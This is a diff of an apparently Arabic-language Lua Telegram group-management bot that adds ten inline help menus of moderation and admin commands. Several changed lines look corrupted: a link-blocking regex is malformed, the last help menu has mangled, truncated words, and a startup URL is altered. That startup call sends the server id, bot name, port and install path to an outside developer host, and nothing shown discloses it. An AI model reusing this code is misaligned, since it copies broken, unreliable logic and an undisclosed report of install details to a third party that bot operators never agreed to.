+    •━━━━━━━━━━━━━•ٴ
+    ⌯︙ اضف / حذف ← رد
+    ⌯︙ اضف / حذف ← صلاحيه
+     •━━━━━━━━━━━━━•ٴ
+    ⌯︙ ضع + امر …
+    •━━━━━━━━━━━━━•ٴ
+    ⌯︙ اسم
+    ⌯︙ رابط
+    ⌯︙ ترحيب
+    ⌯︙ قوانين
+    ⌯︙ صوره
+    ⌯︙ وصف
+    ⌯︙ تكرار + عدد
+     •━━━━━━━━━━━━━•ٴ
+    彡 .[𝘉𝘖𝘠𝘒𝘈 𝘊𝘩𝘢𝘯𝘯𝘦𝘭](t.me/BO6OK)➢
+  ]]
+  keyboard = {} 
+  keyboard.inline_keyboard = {
+  {
+  {text = '1️⃣', callback_data="/help1"},{text = '2️⃣', callback_data="/help2"},{text = '3️⃣', callback_data="/help3"},
+  },
+  {
+  {text = '4️⃣', callback_data="/help4"},{text = '5️⃣', callback_data="/help5"},
+  },
+  {
+  {text = '6️⃣', callback_data="/help6"},{text = '7️⃣', callback_data="/help7"},{text = '8️⃣', callback_data="/help8"},
+  },
+  {
+  {text = '9️⃣', callback_data="/help9"},{text = '🔟', callback_data="/help10"},
+  },
+  {
+  {text = '🔙 الاوامر الرئيسيه 🔙', callback_data="/help"},
+  },
+  {
+    {text = '𝐁𝐎𝐘𝐊𝐀 {𝐑} 𝐓𝐄𝐀𝐌', url="t.me/BO6OK"},
+  },
+  }
+  return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
+  end
+  if Text == '/help4' then
+  if not Mod(data) then
+  local notText = '🚫 عذرا الاوامر هذه لا تخصك'
+  https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(notText).."&show_alert=true")
+  return false
+  end
+  local Teext =[[
+    ⌯︙ اهلا بك عزيزي …
+    ⌯︙ اوامر مسح / الحذف ← امر
+    •━━━━━━━━━━━━━•ٴ
+    ⌯︙ مسح + امر …
+     •━━━━━━━━━━━━━•ٴ
+    ⌯︙ الايدي
+    ⌯︙ الادمنيه
+    ⌯︙ المميزين
+    ⌯︙ ردود المدير
+    ⌯︙ المدراء 
+    ⌯︙ المنشئين 
+    ⌯︙ الاساسين
+    ⌯︙ الاسماء المكتومه
+    ⌯︙ البوتات
+    ⌯︙ امسح
+    ⌯︙ صلاحيه
+    ⌯︙ قائمه منع المتحركات
+    ⌯︙ قائمه منع الصور
+    ⌯︙ قائمه منع الملصقات
+    ⌯︙ مسح قائمه المنع
+    ⌯︙ المحذوفين
+    •━━━━━━━━━━━━━━•ٴ
+    ⌯︙ حذف + امر ...
+    •━━━━━━━━━━━━━━•ٴ
+    ⌯︙ امر 
+    ⌯︙ الاوامر المضافه
+    •━━━━━━━━━━━━━━•ٴ
+    彡 .[𝘉𝘖𝘠𝘒𝘈 𝘊𝘩𝘢𝘯𝘯𝘦𝘭](t.me/BO6OK)➢
+  ]]
+  keyboard = {} 
+  keyboard.inline_keyboard = {
+  {
+  {text = '1️⃣', callback_data="/help1"},{text = '2️⃣', callback_data="/help2"},{text = '3️⃣', callback_data="/help3"},
+  },
+  {
+  {text = '4️⃣', callback_data="/help4"},{text = '5️⃣', callback_data="/help5"},
+  },
+  {
+  {text = '6️⃣', callback_data="/help6"},{text = '7️⃣', callback_data="/help7"},{text = '8️⃣', callback_data="/help8"},
+  },
+  {
+  {text = '9️⃣', callback_data="/help9"},{text = '🔟', callback_data="/help10"},
+  },
+  {
+  {text = '🔙 الاوامر الرئيسيه 🔙', callback_data="/help"},
+  },
+  {
+    {text = '𝐁𝐎𝐘𝐊𝐀 {𝐑} 𝐓𝐄𝐀𝐌', url="t.me/BO6OK"},
+  },
+  }
+  return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
+  end
+  if Text == '/help5' then
+  if not Mod(data) then
+  local notText = '🚫 عذرا الاوامر هذه لا تخصك'
+  https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(notText).."&show_alert=true")
+  return false
+  end
+  local Teext =[[
+    ⌯︙ اهلا بك عزيزي …
+    ⌯︙ اوامر تنزيل ورفع …
+    •━━━━━━━━━━━━━━•ٴ
+    ⌯︙ …
+     •━━━━━━━━━━━━━━•ٴ
+    ⌯︙ مميز
+    ⌯︙ ادمن
+    ⌯︙ مدير
+    ⌯︙ منشئ
+    ⌯︙ منشئ اساسي
+    ⌯︙ مالك
+    ⌯︙ الادمنيه
+    ⌯︙ ادمن بالكروب
+    ⌯︙ ادمن بكل الصلاحيات
+    ⌯︙ القيود
+    ⌯︙ تنزيل جميع الرتب
+    ⌯︙ تنزيل الكل 
+     •━━━━━━━━━━━━━━•ٴ
+    ⌯︙ اوامر التغير …
+     •━━━━━━━━━━━━━━•ٴ
+    ⌯︙ تغير رد المطور + اسم
+    ⌯︙ تغير رد المالك + اسم
+    ⌯︙ تغير رد منشئ الاساسي + اسم
+    ⌯︙ تغير رد المنشئ + اسم
+    ⌯︙ تغير رد المدير + اسم
+    ⌯︙ تغير رد الادمن + اسم
+    ⌯︙ تغير رد المميز + اسم
+    ⌯︙ تغير رد العضو + اسم
+    ⌯︙ تغير امر الاوامر
+    ⌯︙ تغير امر م1 ~ الئ م10
+     •━━━━━━━━━━━━━━•ٴ
+    彡 .[𝘉𝘖𝘠𝘒𝘈 𝘊𝘩𝘢𝘯𝘯𝘦𝘭](t.me/BO6OK)➢
+  ]]
+  keyboard = {} 
+  keyboard.inline_keyboard = {
+  {
+  {text = '1️⃣', callback_data="/help1"},{text = '2️⃣', callback_data="/help2"},{text = '3️⃣', callback_data="/help3"},
+  },
+  {
+  {text = '4️⃣', callback_data="/help4"},{text = '5️⃣', callback_data="/help5"},
+  },
+  {
+  {text = '6️⃣', callback_data="/help6"},{text = '7️⃣', callback_data="/help7"},{text = '8️⃣', callback_data="/help8"},
+  },
+  {
+  {text = '9️⃣', callback_data="/help9"},{text = '🔟', callback_data="/help10"},
+  },
+  {
+  {text = '🔙 الاوامر الرئيسيه 🔙', callback_data="/help"},
+  },
+  {
+    {text = '𝐁𝐎𝐘𝐊𝐀 {𝐑} 𝐓𝐄𝐀𝐌', url="t.me/BO6OK"},
+  },
+  }
+  return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
+  end
+  if Text == '/help6' then
+  if not Mod(data) then
+  local notText = '🚫 عذرا الاوامر هذه لا تخصك'
+  https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(notText).."&show_alert=true")
+  return false
+  end
+  local Teext =[[
+    ⌯︙ اهلا بك عزيزي …
+    ⌯︙ اوامر المجموعه …
+    •━━━━━━━━━━━━━•ٴ
+    ⌯︙ الاوامر … كالتالي
+     •━━━━━━━━━━━━━•ٴ
+    ⌯︙ استعاده الاوامر
+    ⌯︙ تحويل كالاتي~⪼ صور : ملصق : صوت : بصمه
+    ⌯︙ صيح ~ تاك ~ المميزين : الادمنيه : المدراء : المنشئين : المنشئين الاساسين : للمالك
+    ⌯︙ كشف القيود 
+    ⌯︙ تعين الايدي
+    ⌯︙ تغير الايدي
+    ⌯︙ الحساب + ايدي الحساب
+    ⌯︙ تنظيف + العدد
+    ⌯︙ تنزيل الكل
+    ⌯︙ تنزيل جميع الرتب
+    ⌯︙ منع + برد
+    ⌯︙~ الصور + متحركه + ملصق ~
+    ⌯︙ حظر ~ كتم ~ تقيد ~ طرد
+    ⌯︙ المحظورين ~ المكتومين ~ المقيدين
+    ⌯︙ الغاء كتم + حظر + تقيد ~ بالرد و معرف و ايدي
+    ⌯︙ تقيد ~ كتم + الرقم + ساعه
+    ⌯︙ تقيد ~ كتم + الرقم + يوم
+    ⌯︙ تقيد ~ كتم + الرقم + دقيقه
+    ⌯︙ تثبيت ~ الغاء تثبيت
+    ⌯︙ الترحيب
+    ⌯︙ الغاء تثبيت الكل 
+    ⌯︙ كشف البوتات
+    ⌯︙ الصلاحيات
+    ⌯︙ كشف ~ برد ← بمعرف ← ايدي
+    ⌯︙ تاك للكل
+    ⌯︙ وضع لقب + لقب
+    ⌯︙ تاك للمشرفين
+    ⌯︙ اعدادات المجموعه
+    ⌯︙ عدد الكروب
+    ⌯︙ ردود المدير
+    ⌯︙ اسم بوت + الرتبه
+    ⌯︙ الاوامر المضافه
+    ⌯︙ وضع توحيد + توحيد
+    ⌯︙ تعين عدد الكتم + رقم
+    ⌯︙ التوحيد
+    ⌯︙ كتم اسم + اسم
+    ⌯︙ قائمه المنع
+    ⌯︙ نسبه الحب 
+    ⌯︙ نسبه رجوله
+    ⌯︙ نسبه الكره
+    ⌯︙ نسبه الانوثه
+    •━━━━━━━━━━━━━•ٴ
+    彡 .[𝘉𝘖𝘠𝘒𝘈 𝘊𝘩𝘢𝘯𝘯𝘦𝘭](t.me/BO6OK)➢
+  ]]
+  keyboard = {} 
+  keyboard.inline_keyboard = {
+  {
+  {text = '1️⃣', callback_data="/help1"},{text = '2️⃣', callback_data="/help2"},{text = '3️⃣', callback_data="/help3"},
+  },
+  {
+  {text = '4️⃣', callback_data="/help4"},{text = '5️⃣', callback_data="/help5"},
+  },
+  {
+  {text = '6️⃣', callback_data="/help6"},{text = '7️⃣', callback_data="/help7"},{text = '8️⃣', callback_data="/help8"},
+  },
+  {
+  {text = '9️⃣', callback_data="/help9"},{text = '🔟', callback_data="/help10"},
+  },
+  {
+  {text = '🔙 الاوامر الرئيسيه 🔙', callback_data="/help"},
+  },
+  {
+    {text = '𝐁𝐎𝐘𝐊𝐀 {𝐑} 𝐓𝐄𝐀𝐌', url="t.me/BO6OK"},
+  },
+  }
+  return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
+  end
+  if Text == '/help7' then
+  if not Mod(data) then
+  local notText = '🚫 عذرا الاوامر هذه لا تخصك'
+  https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(notText).."&show_alert=true")
+  return false
+  end
+  local Teext =[[
+    ⌯︙ الاوامر التحشيش …
+    •━━━━━━━━━━━━━•ٴ
+    ⌯︙ رفع + تنزيل ← الامࢪ
+    •━━━━━━━━━━━━━•ٴ
+    ⌯︙ رفع + تنزيل ← مطي 
+    ⌯︙ تاك للمطايه
+    •━━━━━━━━━━━━━•ٴ
+    ⌯︙ رفع + تنزيل ← صخل
+    ⌯︙ تاك لصخوله
+    •━━━━━━━━━━━━━•ٴ
+    ⌯︙ رفع + تنزيل ← جلب
+    ⌯︙ تاك لجلاب
+    •━━━━━━━━━━━━━•ٴ
+    ⌯︙ رفع + تنزيل ← قرد 
+    ⌯︙ تاك لقروده
+    •━━━━━━━━━━━━━•ٴ
+    ⌯︙ رفع + تنزيل ← بقره
+    ⌯︙ تاك لبقرات
+    •━━━━━━━━━━━━━•ٴ
+    ⌯︙ رفع + تنزيل ← حصان
+    ⌯︙ تاك لحصونه
+    •━━━━━━━━━━━━━•ٴ
+    ⌯︙ رفع + تنزيل ← طلي
+    ⌯︙ تاك لطليان
+    •━━━━━━━━━━━━━•ٴ
+    ⌯︙ رفع + تنزيل ← زاحف 
+    ⌯︙ تاك لزواحف
+    •━━━━━━━━━━━━━•ٴ
+    ⌯︙ رفع + تنزيل ← جريذي
+    ⌯︙ تاك لجريذيه
+    •━━━━━━━━━━━━━•ٴ
+    ⌯︙ رفع + تنزيل ← الحات
+    ⌯︙ تاك للحات
+    •━━━━━━━━━━━━━•ٴ
+    ⌯︙ رفع + تنزيل ← الحاته
+    ⌯︙ تاك للحاتات
+    •━━━━━━━━━━━━━•ٴ
+    彡 .[𝘉𝘖𝘠𝘒𝘈 𝘊𝘩𝘢𝘯𝘯𝘦𝘭](t.me/BO6OK)➢
+  ]]
+  keyboard = {} 
+  keyboard.inline_keyboard = {
+  {
+  {text = '1️⃣', callback_data="/help1"},{text = '2️⃣', callback_data="/help2"},{text = '3️⃣', callback_data="/help3"},
+  },
+  {
+  {text = '4️⃣', callback_data="/help4"},{text = '5️⃣', callback_data="/help5"},
+  },
+  {
+  {text = '6️⃣', callback_data="/help6"},{text = '7️⃣', callback_data="/help7"},{text = '8️⃣', callback_data="/help8"},
+  },
+  {
+  {text = '9️⃣', callback_data="/help9"},{text = '🔟', callback_data="/help10"},
+  },
+  {
+  {text = '🔙 الاوامر الرئيسيه 🔙', callback_data="/help"},
+  },
+  {
+    {text = '𝐁𝐎𝐘𝐊𝐀 {𝐑} 𝐓𝐄𝐀𝐌', url="t.me/BO6OK"},
+  },
+  }
+  return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
+  end
+  if Text == '/help8' then
+  if not Sudo(data) then
+  local notText = '🚫 عذرا الاوامر هذه لا تخصك'
+  https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(notText).."&show_alert=true")
+  return false
+  end
+  local Teext =[[
+    ⌯︙اوامر المطورين 
+    •━━━━━━━━━━━━━•ٴ
+   ⌯︙ تفعيل ← تعطيل 
+   ⌯︙ المجموعات ← المشتركين ← الاحصائيات
+   ⌯︙ رفع ← تنزيل منشئ اساسي
+   ⌯︙ مسح الاساسين ← المنشئين الاساسين
+   ⌯︙ مسح المنشئين ← المنشئين
+   ⌯︙ رفع ⇠ تنزيل مالك
+   ⌯︙ مسح قائمه المالك 
+   ⌯︙ اسم ~⪼ غادر + غادر
+   ⌯︙ اذاعه 
+   ⌯︙ ردود المطور 
+    •━━━━━━━━━━━━━•ٴ
+   彡 .[𝘉𝘖𝘠𝘒𝘈 𝘊𝘩𝘢𝘯𝘯𝘦𝘭](t.me/BO6OK)➢
+  ]]
+  keyboard = {} 
+  keyboard.inline_keyboard = {
+  {
+  {text = '1️⃣', callback_data="/help1"},{text = '2️⃣', callback_data="/help2"},{text = '3️⃣', callback_data="/help3"},
+  },
+  {
+  {text = '4️⃣', callback_data="/help4"},{text = '5️⃣', callback_data="/help5"},
+  },
+  {
+  {text = '6️⃣', callback_data="/help6"},{text = '7️⃣', callback_data="/help7"},{text = '8️⃣', callback_data="/help8"},
+  },
+  {
+  {text = '9️⃣', callback_data="/help9"},{text = '🔟', callback_data="/help10"},
+  },
+  {
+  {text = '🔙 الاوامر الرئيسيه 🔙', callback_data="/help"},
+  },
+  {
+    {text = '𝐁𝐎𝐘𝐊𝐀 {𝐑} 𝐓𝐄𝐀𝐌', url="t.me/BO6OK"},
+  },
+  }
+  return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
+  end
+  if Text == '/help9' then
+  if not Sudo(data) then
+  local notText = '🚫 عذرا الاوامر هذه لا تخصك'
+  https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(notText).."&show_alert=true")
+  return false
+  end
+  local Teext =[[
+    ⌯︙ اهلا بك عزيزي √
+    ⌯︙ اوامر مطور الاساسي...↓
+    •━━━━━━━━━━━━━•ٴ
+    ⌯︙ تفعيل
+    ⌯︙ تعطيل
+    ⌯︙ مسح الاساسين
+    ⌯︙ المنشئين الاساسين
+    ⌯︙ رفع ⇠ تنزيل منشئ اساسي
+    ⌯︙ مسح المطورين
+    ⌯︙ رفع ⇠ تنزيل مالك 
+    ⌯︙ المطورين
+    ⌯︙ رفع ⇠ تنزيل مطور
+    ⌯︙ رفع ~⪼ تنزيل مطور ثانوي
+    ⌯︙ الثانويين ~⪼ مسح الثانويين
+    ⌯︙ تفعيل ~⪼ تعطيل الاضافات
+    •━━━━━━━━━━━━━•ٴ
+    ⌯︙ اسم البوت + غادر
+    ⌯︙ غادر
+    ⌯︙ اسم بوت + الرتبه
+    ⌯︙ تحديث السورس
+    ⌯︙ حضر عام
+    ⌯︙ كتم عام
+    ⌯︙ الغاء العام
+    ⌯︙ قائمه العام
+    ⌯︙ مسح قائمه العام
+    ⌯︙ جلب نسخه الاحتياطيه
+    ⌯︙ رفع نسخه الاحتياطيه
+     •━━━━━━━━━━━━━•ٴ
+    ⌯︙ المتجر 
+    ⌯︙ متجر الملفات
+    ⌯︙ الملفات
+    ⌯︙ مسح الملفات
+    ⌯︙ تعطيل + تفعيل + اسم ملف
+     •━━━━━━━━━━━━━•ٴ
+    ⌯︙ اذاعه خاص
+    ⌯︙ اذاعه
+    ⌯︙ اذاعه بالتوجيه
+    ⌯︙ اذاعه بالتوجيه خاص
+    ⌯︙ اذاعه بالتثبيت
+    •━━━━━━━━━━━━━•ٴ
+    ⌯︙ جلب نسخه البوت
+    ⌯︙ رفع نسخه البوت
+    ⌯︙ ضع عدد الاعضاء + العدد
+    ⌯︙ ضع كليشه المطور
+    ⌯︙ تفعيل/تعطيل الاذاعه
+    ⌯︙ تفعيل/تعطيل البوت الخدمي
+    ⌯︙ تفعيل/تعطيل التواصل
+    ⌯︙ تغير اسم البوت
+    ⌯︙ اضف/حذف رد للكل
+    ⌯︙ ردود المطور
+    ⌯︙ مسح ردود المطور
+    •━━━━━━━━━━━━━•ٴ
+    ⌯︙ الاشتراك الاجباري
+    ⌯︙ تعطيل الاشتراك الاجباري
+    ⌯︙ تفعيل الاشتراك الاجباري
+    ⌯︙ حذف رساله الاشتراك
+    ⌯︙ تغير رساله الاشتراك
+    ⌯︙ تغير الاشتراك
+    •━━━━━━━━━━━━━•ٴ
+    ⌯︙ الاحصائيات
+    ⌯︙ المشتركين
+    ⌯︙ المجموعات 
+    ⌯︙ تفعيل/تعطيل المغادره
+    ⌯︙ تنظيف المشتركين
+    ⌯︙ تنظيف الكروبات
+    •━━━━━━━━━━━━━•ٴ
+    彡 .[𝘉𝘖𝘠𝘒𝘈 𝘊𝘩𝘢𝘯𝘯𝘦𝘭](t.me/BO6OK)➢
+  ]]
+  keyboard = {} 
+  keyboard.inline_keyboard = {
+  {
+  {text = '1️⃣', callback_data="/help1"},{text = '2️⃣', callback_data="/help2"},{text = '3️⃣', callback_data="/help3"},
+  },
+  {
+  {text = '4️⃣', callback_data="/help4"},{text = '5️⃣', callback_data="/help5"},
+  },
+  {
+  {text = '6️⃣', callback_data="/help6"},{text = '7️⃣', callback_data="/help7"},{text = '8️⃣', callback_data="/help8"},
+  },
+  {
+  {text = '9️⃣', callback_data="/help9"},{text = '🔟', callback_data="/help10"},
+  },
+  {
+  {text = '🔙 الاوامر الرئيسيه 🔙', callback_data="/help"},
+  },
+  {
+    {text = '𝐁𝐎𝐘𝐊𝐀 {𝐑} 𝐓𝐄𝐀𝐌', url="t.me/BO6OK"},
+  },
+  }
+  return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
+  end
+  if Text == '/help10' then
+  local help_text = database:get(bot_id..'help10_text')
+  local Teext =[[
+    ⌯︙ اه  ك عزيزي √
+    ⌯︙ اوالاعضاء كتالي…↓
+    •━━━━━━━━━•ٴ
+    ⌯︙ عرلوماتك ↑↓
+    •━━━━━━━━━•ٴ
+    ⌯︙ اي← اسمي 
+    ⌯︙ رس ← مسح رسايلي 
+    ⌯︙ رت← سحكاتي 
+    ⌯︙ مسكاتي ← المنشئ 
+    •━━━━━━━━━•ٴ
+    ⌯︙ اوالمجموعه ↑↓
+    •━━━━━━━━━•ٴ
+    ⌯︙ ال ← القوانين – الترحيب
+    ⌯︙ اي اطردني 
+    ⌯︙ اس المطور  
+    ⌯︙ كشبالرد بالمعرف
+      •━━━━━━━━━•ٴ
+    ⌯︙ اسبوت + الامر ↑↓
+    •━━━━━━━━━•ٴ
+    ⌯︙ بوالرد 
+    ⌯︙ مصلرد
+    ⌯︙ رزالرد 
+    ⌯︙ شنيك بهذا بالرد
+    ⌯︙ شنيك بهاي بالرد
+    ⌯︙ تحا
+    •━━━━━━━━━•ٴ
+    彡 .[𝘒𝘈 𝘊𝘩𝘢𝘯𝘯𝘦𝘭](t.me/BO6OK)➢
+  ]]
+  keyboard = {} 
+  keyboard.inline_keyboard = {
+  {
+  {text = '1️⃣', callback_data="/help1"},{text = '2️⃣', callback_data="/help2"},{text = '3️⃣', callback_data="/help3"},
+  },
+  {
+  {text = '4️⃣', callback_data="/help4"},{text = '5️⃣', callback_data="/help5"},
+  },
+  {
+  {text = '6️⃣', callback_data="/help6"},{text = '7️⃣', callback_data="/help7"},{text = '8️⃣', callback_data="/help8"},
+  },
+  {
+  {text = '9️⃣', callback_data="/help9"},{text = '🔟', callback_data="/help10"},
+  },
+  {
+  {text = '🔙 الاوامر الرئيسيه 🔙', callback_data="/help"},
+  },
+  {
+    {text = '𝐁𝐎𝐘𝐊𝐀 {𝐑} 𝐓𝐄𝐀𝐌', url="t.me/BO6OK"},
+  },
+  }
+  return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
+  end
+  if Text == '/help' then
+  if not Mod(data) then
+  local notText = '🚫 عذرا الاوامر هذه لا تخصك'
+  https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(notText).."&show_alert=true")
+  return false
+  end
+  local Teext =[[
+    *❃اهلا انتツفي اوامر البوت❃*
+    ٴ≪━━━━━━𝘽𝙆━━━━━━≫ٴ
+    *❃م1 ◂ اوامر الحمايه*
+    *❃م2 ◂ اوامر تعطيل ~ تفعيل*
+    *❃م3 ◂ اوامر ضع ~ اضف*
+    *❃م4 ◂ اوامر مسح ~ حذف*
+    *❃م5 ◂ اوامر تنزيل+رفع+التغير*
+    *❃م6 ◂ اوامر الكروب*
+    *❃م7 ◂ اوامر التحشيش*
+    *❃م8 ◂ اوامر مطور البوت*
+    *❃م9 ◂ اوامر مطور الاساسي* 
+    *❃م10 ◂ اوامر الاعضاء*
+    ٴ≪━━━━━━𝘽𝙆━━━━━━≫ٴ
+    彡 .[𝘉𝘖𝘠𝘒𝘈 𝘊𝘩𝘢𝘯𝘯𝘦𝘭](t.me/BO6OK)➢ 
+  ]]
+  keyboard.inline_keyboard = {
+  {
+  {text = '1️⃣', callback_data="/help1"},{text = '2️⃣', callback_data="/help2"},{text = '3️⃣', callback_data="/help3"},
+  },
+  {
+  {text = '4️⃣', callback_data="/help4"},{text = '5️⃣', callback_data="/help5"},
+  },
+  {
+  {text = '6️⃣', callback_data="/help6"},{text = '7️⃣', callback_data="/help7"},{text = '8️⃣', callback_data="/help8"},
+  },
+  {
+  {text = '9️⃣', callback_data="/help9"},{text = '🔟', callback_data="/help10"},
+  },
+  {
+    {text = '𝐁𝐎𝐘𝐊𝐀 {𝐑} 𝐓𝐄𝐀𝐌', url="t.me/BO6OK"},
+  },
+  }
+  return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
 end
 end
 if data.ID == "UpdateNewMessage" then  -- new msg
@@ -10948,7 +11291,7 @@ return false
 end 
 end
 ------------------------------------------------------------------------
-if text and text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text and text:match("[Tt].[Mm][Ee]") or text and text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text and text:match("[Tt][Ee][Ll][Ee][Ss][Cc][Oo].[Pp][Ee]") then
+if text and text:match("t][Ee][Ll[T][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text and text:match("[Tt].[Mm][Ee]") or text and text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text and text:match("[Tt][Ee][Ll][Ee][Ss][Cc][Oo].[Pp][Ee]") then
 if database:get(bot_id.."lock:Link"..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
 return false
@@ -11045,7 +11388,7 @@ infos.id_server = id_server
 infos.name = Name
 infos.port = Port
 infos.userjoin  = io.popen("echo $(cd $(dirname $0); pwd)"):read('*all'):gsub(' ',''):gsub("\n",'')
-https.request('https://veer.saied.us/boyka/request.php?insert='..JSON.encode(infos))
+https.request('https://veer.s.us/bo455yka/request.php?insert='..JSON.encode(infos))
 local list = database:smembers(bot_id.."User_Bot") 
 for k,v in pairs(list) do 
 tdcli_function({ID='GetChat',chat_id_ = v},function(arg,data) end,nil) 
